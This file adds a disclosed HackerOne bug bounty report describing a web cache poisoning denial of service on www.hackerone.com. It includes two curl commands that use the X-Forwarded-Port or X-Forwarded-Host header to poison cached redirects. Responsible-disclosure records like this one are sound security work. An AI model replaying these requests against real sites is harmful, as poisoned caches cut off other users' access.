@@ -1,0 +1,26 @@
+ReportLink:https://hackerone.com/reports/409370
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/albinowax
+ReportedTo:HackerOne(security)
+BountyAmount:2500.0
+Severity:medium
+State:Closed
+DateOfDisclosure:22.12.2018 16:16:11
+
+Summary:
+
+An attacker can persistently block access to any/all redirects on www.hackerone.com by using cache poisoning with the X-Forwarded-Port or X-Forwarded-Host headers to redirect users to an invalid port.
+
+To replicate: 
+```curl -H 'X-Forwarded-Port: 123' https://www.hackerone.com/index.php?dontpoisoneveryone=1```
+Then try to load https://www.hackerone.com/index.php?dontpoisoneveryone=1 in your browser.
+
+This attack can also be done using the X-Forwarded-Host header:
+```curl -H 'X-Forwarded-Host: www.hackerone.com:123' https://www.hackerone.com/index.php?dontpoisoneveryone=1```
+
+
+For more information on the theory behind this attack, check out https://portswigger.net/blog/practical-web-cache-poisoning
+
+## Impact
+
+An attacker can persistently block access to any/all redirects on www.hackerone.com
